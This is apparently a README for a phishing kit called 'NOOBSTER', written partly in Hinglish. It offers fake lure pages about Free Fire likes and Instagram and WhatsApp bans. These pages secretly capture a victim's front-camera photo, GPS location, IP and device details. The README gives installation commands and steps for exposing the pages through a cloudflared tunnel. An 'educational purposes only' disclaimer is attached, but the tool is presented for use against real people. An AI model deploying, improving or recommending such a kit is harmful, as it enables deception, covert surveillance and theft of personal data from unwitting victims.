# 🎣 NOOBSTER PHISHING TOOL

Terminal-based phishing lab tool. Local mode.  
Menu se page choose karo → cloudflared se expose karo → data capture ho jayega.

**Owner:** NOOBSTER  
**Channel:** [t.me/noob11001](https://t.me/noob11001)

---

## ⚠️ Disclaimer

This tool is for **educational purposes only**.  
Use it only on devices you own or have explicit written permission for.  
The author is not responsible for any misuse.

---

## ✨ Features

- Terminal menu with 4 modules
- Real-look professional pages
- Smooth "Verifying" popup animation
- Captures: front camera photo, GPS location, IP, device info, battery, GPU, screen, timezone, network
- Saves everything in organized folders
- Live colored terminal feed

---

## 📦 Modules

| # | Module | Captures |
|---|--------|----------|
| 1 | 🎮 Free Fire Likes | UID |
| 2 | 📵 Instagram Ban | username |
| 3 | 📥 IG Private Download | username |
| 4 | 💬 WhatsApp Ban | number |

---

## 🔧 Installation

```bash
pkg update && pkg upgrade -y
pkg install python git cloudflared -y
git clone https://github.com/noob-bhai/noobster-phising.git
cd noobster-phising
pip install -r requirements.txt
python run.py
```

▶️ Usage

Step 1 — server start

```bash
python run.py
```

menu aayega → 1 (ya 2/3/4) choose karo → 0 dabao

Step 2 — tunnel (alag terminal)

```bash
cloudflared tunnel --url http://localhost:5000
```

link milega jaise https://xyz.trycloudflare.com

Step 3 — page khol

```
https://xyz.trycloudflare.com/freefire
```

---

📂 File Structure

```
noobster/
├── run.py
├── requirements.txt
├── static/
│   ├── style.css
│   └── capture.js
├── templates/
│   ├── freefire.html
│   ├── ig_ban.html
│   ├── ig_download.html
│   └── wa_ban.html
└── captures/
```

---

📢 Channel

Join for updates: t.me/noob11001

---

📜 License

MIT — use at your own risk.

```

---
